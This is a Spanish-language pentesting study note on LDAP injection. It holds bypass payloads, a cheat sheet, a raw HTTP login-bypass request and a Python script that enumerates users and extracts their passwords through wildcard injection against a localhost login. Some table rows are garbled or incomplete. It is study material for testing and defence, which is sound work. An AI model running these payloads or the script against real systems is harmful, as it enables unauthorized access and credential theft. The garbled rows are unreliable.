
---
Tags: #LDAP #injection #bypass #enumeracion

---
# 📖 Definición

> [[LDAP Injection]] es una vulnerabilidad que ocurre cuando una aplicación web no **sanea correctamente** la entrada del usuario, permitiendo inyectar comandos o filtros maliciosos en consultas LDAP.

El atacante puede manipular las consultas LDAP para **bypassear autenticación**, **extraer información sensible**, o incluso **modificar entradas** en el directorio.

---

## 🔎 ¿Qué es LDAP?

LDAP (Lightweight Directory Access Protocol) es un protocolo para acceder y administrar servicios de directorios como **Active Directory**, **OpenLDAP**, etc.

Se usa comúnmente para:

- Autenticación de usuarios
    
- Consulta de perfiles
    
- Gestión de recursos (usuarios, grupos, dispositivos)
    

---

## 🧪 Funcionamiento lógico

Una típica consulta LDAP en una aplicación:

```ldap
(&(uid=<input_username>)(userPassword=<input_password>))
```

Si el input no está saneado, puede ser modificado:
```ldap
(&(uid=*)(userPassword=*))
```

Lo que daría acceso sin validación.

---

## 💥 Vectores de ataque comunes

|Inyección|Resultado|
|---|---|
|`*)(&)`|Inyección nula / true|
|`_)(uid=_))(|(uid=*`|
|`*)(userPassword=*)`|Bypass de autenticación|
|`admin)(|(password=*)`|
|`*)(|(objectClass=*))`|

---

## 🧪 Ejemplo de autenticación vulnerable

### Código vulnerable (PHP):

```ladp
$filter = "(&(uid=" . $_POST['username'] . ")(userPassword=" . $_POST['password'] . "))";
```
### Input malicioso:

```text
username = admin)(|(uid=* password = anything
```
### Resultado de la consulta:

```ldap
(&(uid=admin)(|(uid=*))(userPassword=anything))
```

Se convierte en __si uid=admin OR uid=_ → TRUE_*, bypass exitoso.

---
## 🧰 Técnicas de explotación

### 🔐 1. Bypass de autenticación

|Input|Resultado|
|---|---|
|`admin)(|(uid=*))`|
|`*)(objectClass=*)`|Lista todas las entradas|
|`_)(uid=_))(|(uid=*`|

---

### 🔍 2. Extracción de información

Si la aplicación devuelve diferentes mensajes de error según el input, se puede inferir:
```text
username = admin)(userPassword=wrongpass
```

Si da distinto error que:
```text
username = noexiste)(userPassword=any
```
→ Se sabe si `admin` existe.

---

### 🔄 3. LDAP Injection ciega (Blind LDAPi)

Se prueba input malicioso y se analizan **diferencias en tiempo o mensajes de error**.

```ldap
(&(uid=admin)(!(userPassword=fail)))
```

→ Si funciona, significa que `userPassword != fail` → prueba válida.

---

### 🪛 4. LDAP OR Injection

Permite introducir expresiones OR para modificar lógica:

```text
username = admin)(|(userPassword=*) password = any
```

→ Consulta: `(&(uid=admin)(|(userPassword=*)))`

---

## 🚧 Detección

|Método|Descripción|
|---|---|
|Prueba con caracteres `*`, `)`, `&`, `|`|
|Mensajes de error|Consultas LDAP malformadas pueden revelar detalles internos|
|Cambios en resultados|Pruebas con booleanos que alteran la lógica|

---

## 🧪 Pruebas típicas para detectar LDAPi

```txt
*)(& admin)(| *)(objectClass=*) admin)(userPassword=*
```

Si al enviar estos valores se obtiene:

- Acceso inesperado
    
- Respuesta alterada
    
- Errores específicos de LDAP
    

→ Es vulnerable.

---

## 🧰 Herramientas útiles

|Herramienta|Descripción|
|---|---|
|🐍 **ldapsearch**|Utilidad de línea de comandos para LDAP|
|🧪 **Burp Suite**|Para detectar variaciones en respuesta|
|⚔️ **FuzzDB**|Incluye payloads de LDAP Injection|
|🔍 **Nuclei**|Plantillas para escanear LDAP Injection|
|🔐 **LDAP Admin**|GUI para explorar servidores LDAP|

---

## 🔧 Ejemplo real de payload para login bypass

```txt
POST /login HTTP/1.1 Content-Type: application/x-www-form-urlencoded  username=admin)(|(userPassword=*)&password=test
```

---

## 🛡️ Prevención y mitigación

|Acción|Descripción|
|---|---|
|✂️ Escapar caracteres|Filtrar: `* ( ) \ / &|
|🔒 Validar entradas|Usar listas blancas (whitelisting)|
|🔐 Autenticación externa|Delegar login a servicios seguros (OAuth, etc.)|
|🧪 Fuzzing defensivo|Probar expresiones malformadas antes de hacer consultas LDAP|

---

## 🎯 LDAP Injection Cheat Sheet

|Expresión|Descripción|
|---|---|
|`_)(uid=_))(|(uid=*`|
|`admin)(|(userPassword=*)`|
|`*)(objectClass=*)`|Devuelve todas las entradas|
|`admin)(!(password=pass))`|LDAP Injection ciega|

---
# Ejemplo de Script

```python
#!/usr/bin/env python3

import requests
import string
import time
import sys
import signal
from pwn import *

# Ctrl + C
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Globales
login_url = "http://localhost:4000/login"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

charset = string.ascii_letters + string.digits
user_list = []

def enumerate_users():
    user = ""
    p1 = log.progress("Enumerando usuarios")
    while True:
        found = False
        for c in charset:
            payload = f"username=*)(uid={user + c}*)&password=test"
            r = requests.post(login_url, data=payload, headers=headers)
            if "Valid" in r.text or r.status_code == 302:
                user += c
                p1.status(user)
                found = True
                break
        if not found:
            if user != "":
                print(f"\n[+] Usuario encontrado: {user}")
                user_list.append(user)
                user = ""
            else:
                break

def enumerate_passwords():
    for user in user_list:
        password = ""
        p2 = log.progress(f"Enumerando contraseña para {user}")
        while True:
            found = False
            for c in charset:
                payload = f"username={user}&password=*)({password + c}*"
                r = requests.post(login_url, data=payload, headers=headers)
                if "Valid" in r.text or r.status_code == 302:
                    password += c
                    p2.status(password)
                    found = True
                    break
            if not found:
                print(f"[+] Contraseña de {user}: {password}")
                break

if __name__ == "__main__":
    enumerate_users()
    if user_list:
        enumerate_passwords()
    else:
        print("[-] No se encontraron usuarios")

```

---
# Referencias

- 🧪 Portswigger:[Enlace](https://portswigger.net/kb/issues/00100500_ldap-injection)
- 🔗 PayloadsAllTheThings:[PayloadsAllTheThings LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md)
- 🔗 OWASP: [LDAP Injection Cheat Sheet](https://owasp.org/www-community/attacks/LDAP_Injection)
- 🧪 Pentestmonkey LDAP Injection:[Enlace](http://pentestmonkey.net/cheat-sheet/ldap-injection-cheat-sheet)